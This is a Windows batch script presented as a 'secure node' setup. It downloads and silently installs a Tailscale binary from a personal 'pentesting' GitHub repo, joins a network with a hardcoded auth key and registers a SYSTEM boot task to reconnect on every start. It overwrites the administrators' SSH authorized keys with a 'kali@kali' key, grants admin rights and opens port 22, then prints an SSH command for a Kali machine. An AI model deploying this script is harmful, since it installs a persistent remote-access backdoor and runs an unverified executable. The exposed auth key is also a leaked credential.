@echo off
setlocal EnableDelayedExpansion

:: ============================================================
:: Windows Secure Node - Full Auto Setup
:: Uses Your GitHub Tailscale Installer + SSH Setup
:: Run as Administrator
:: ============================================================

set "AuthKey=tskey-auth-ko313R9rjT11CNTRL-Z2iyT7DmAa5BjxKi189Ma5g1AmXQgiij"
set "PublicKey=ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK/Kq3bodrF7IrAeD5dAj5Ci7oiSaYSTfFIXOIDRZMpy kali@kali"
set "Username=%USERNAME%"
set "TsBin=C:\Program Files\Tailscale\tailscale.exe"
set "TsInstaller=%TEMP%\tailscale-setup.exe"

echo ================================================
echo     Windows Secure Node - Full Auto Setup
echo ================================================
echo.

:: ============================================================
:: STEP 0 - Download & Install Tailscale from YOUR GitHub
:: ============================================================
set "InstalledNow=0"

if not exist "%TsBin%" (
    echo [0/7] Tailscale not found. Downloading from your GitHub...

    powershell -NoProfile -Command ^
        "Invoke-WebRequest -Uri 'https://github.com/rounitpentesting-blip/tailscale/raw/refs/heads/main/tailscale-setup-1.96.3.exe' ^
         -OutFile '%TsInstaller%' -UseBasicParsing -TimeoutSec 120"

    if exist "%TsInstaller%" (
        echo   Installing Tailscale silently...
        "%TsInstaller%" /quiet /norestart
        echo   Waiting for installation to complete...
        timeout /t 15 /nobreak >nul
        del "%TsInstaller%" /f /q >nul 2>&1
        set "InstalledNow=1"
        echo   Tailscale installed successfully.
    ) else (
        echo.
        echo ERROR: Failed to download Tailscale from your GitHub link.
        echo Please check the link and try again.
        pause
        exit /b 1
    )
) else (
    echo [0/7] Tailscale is already installed.
)

:: Extra wait if freshly installed
if %InstalledNow%==1 (
    echo   Finalizing Tailscale setup...
    timeout /t 8 /nobreak >nul
)

:: ============================================================
:: STEP 1 - Connect to Tailscale
:: ============================================================
echo [1/7] Connecting to Tailscale network...
"%TsBin%" status >nul 2>&1
if %errorlevel% neq 0 (
    echo   Joining your Tailscale network...
    "%TsBin%" up --authkey %AuthKey% --reset --accept-routes --accept-dns
) else (
    echo   Already connected. Re-authenticating...
    "%TsBin%" up --authkey %AuthKey% --reset --accept-routes --accept-dns
)
timeout /t 5 /nobreak >nul

set "tsIP=Not found"
for /f "tokens=*" %%a in ('"%TsBin%" ip -4 2^>nul') do (
    echo %%a | findstr "^100\." >nul && set "tsIP=%%a"
)
echo Tailscale IP detected: %tsIP%
echo.

:: ============================================================
:: STEP 2-7 - Boot task, OpenSSH, SSH key, config, firewall
:: ============================================================
echo [2/7] Setting Tailscale auto-start and boot task...
sc config Tailscale start= auto >nul 2>&1
schtasks /Delete /TN "TailscaleAutoConnect" /F >nul 2>&1
schtasks /Create /TN "TailscaleAutoConnect" /SC ONSTART /DELAY 0001:00 /RU SYSTEM /RL HIGHEST /F ^
    /TR "\"%TsBin%\" up --authkey %AuthKey% --reset --accept-routes --accept-dns" >nul 2>&1

echo [3/7] Checking OpenSSH Server...
set "sshdExe="
if exist "C:\Program Files\OpenSSH\sshd.exe" set "sshdExe=C:\Program Files\OpenSSH\sshd.exe"
if exist "C:\Windows\System32\OpenSSH\sshd.exe" set "sshdExe=C:\Windows\System32\OpenSSH\sshd.exe"

set "needsAction=0"
sc query sshd >nul 2>&1
if %errorlevel% neq 0 set "needsAction=1"
if defined sshdExe (
    for /f "tokens=*" %%v in ('"%sshdExe%" -V 2^>^&1') do set "ver=%%v"
    echo !ver! | findstr /i "_7\._8\." >nul && set "needsAction=1"
)

if %needsAction%==1 (
    echo   Installing/Upgrading OpenSSH...
    powershell -NoProfile -Command "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0" >nul 2>&1
    if errorlevel 1 (
        echo   Falling back to latest OpenSSH...
        powershell -NoProfile -Command ^
            "Invoke-WebRequest -Uri 'https://github.com/PowerShell/Win32-OpenSSH/releases/latest/download/OpenSSH-Win64.zip' ^
             -OutFile '%TEMP%\openssh.zip' -UseBasicParsing"
        net stop sshd >nul 2>&1
        taskkill /F /IM sshd.exe >nul 2>&1
        timeout /t 3 /nobreak >nul
        set "dest=C:\Program Files\OpenSSH"
        if not exist "%dest%" md "%dest%" >nul
        powershell -NoProfile -Command "Expand-Archive '%TEMP%\openssh.zip' -DestinationPath '%TEMP%\openssh-new' -Force"
        xcopy "%TEMP%\openssh-new\OpenSSH-Win64\*" "%dest%\" /E /Y /Q >nul
        if exist "%dest%\install-sshd.ps1" powershell -NoProfile -ExecutionPolicy Bypass -File "%dest%\install-sshd.ps1" >nul 2>&1
        del "%TEMP%\openssh.zip" /f /q >nul 2>&1
        rd /s /q "%TEMP%\openssh-new" >nul 2>&1
    )
) else (
    echo   OpenSSH is already up to date.
)

sc config sshd start= auto >nul 2>&1
net start sshd >nul 2>&1

echo [4/7] Setting up SSH public key...
set "AdminAuthKeys=C:\ProgramData\ssh\administrators_authorized_keys"
( echo %PublicKey% ) > "%AdminAuthKeys%"
icacls "%AdminAuthKeys%" /inheritance:r >nul 2>&1
icacls "%AdminAuthKeys%" /grant "SYSTEM:F" >nul 2>&1
icacls "%AdminAuthKeys%" /grant "BUILTIN\Administrators:F" >nul 2>&1

echo [5/7] Configuring sshd_config...
net stop sshd >nul 2>&1
timeout /t 2 /nobreak >nul
set "sshdConfig=C:\ProgramData\ssh\sshd_config"
(
    echo # sshd_config for secure node
    echo Port 22
    echo PubkeyAuthentication yes
    echo PasswordAuthentication yes
    echo PermitEmptyPasswords no
    echo.
    echo Match Group administrators
    echo     AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys
    echo.
    echo Match Address 100.64.0.0/10
    echo     PasswordAuthentication no
    echo     PubkeyAuthentication yes
) > "%sshdConfig%"
net start sshd >nul 2>&1

echo [6/7] Setting admin rights and firewall...
net localgroup Administrators "%Username%" /add >nul 2>&1

netsh advfirewall firewall delete rule name="SSH-Allow-Tailscale" >nul 2>&1
netsh advfirewall firewall delete rule name="SSH-Allow-Local" >nul 2>&1
netsh advfirewall firewall add rule name="SSH-Allow-Tailscale" dir=in action=allow protocol=TCP localport=22 remoteip=100.64.0.0/10 profile=any >nul
netsh advfirewall firewall add rule name="SSH-Allow-Local" dir=in action=allow protocol=TCP localport=22 remoteip=192.168.0.0/16,10.0.0.0/8,172.16.0.0/12 profile=any >nul

:: ============================================================
:: Final Summary with Full SSH Command
:: ============================================================
echo.
echo ================================================
echo               SETUP COMPLETED SUCCESSFULLY
echo ================================================
echo.

set "finalIP=Not found"
for /f "tokens=*" %%a in ('"%TsBin%" ip -4 2^>nul') do (
    echo %%a | findstr "^100\." >nul && set "finalIP=%%a"
)

set "localIP=Not found"
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /i "IPv4 Address"') do (
    set "line=%%i"
    set "line=!line: =!"
    if not "!line:~0,3!"=="127" if not "!line:~0,3!"=="169" if not "!line:~0,4!"=="10.5" if not "!line:~0,3!"=="100" (
        if "!localIP!"=="Not found" set "localIP=!line!"
    )
)

echo Tailscale IP : %finalIP%
echo Local IP     : %localIP%
echo Username     : %Username%
echo.
echo Full SSH Command (copy this on Kali):
echo.
echo    ssh %Username%@%finalIP%
echo.
echo This node will auto-connect to Tailscale on every boot.
echo.
pause
endlocal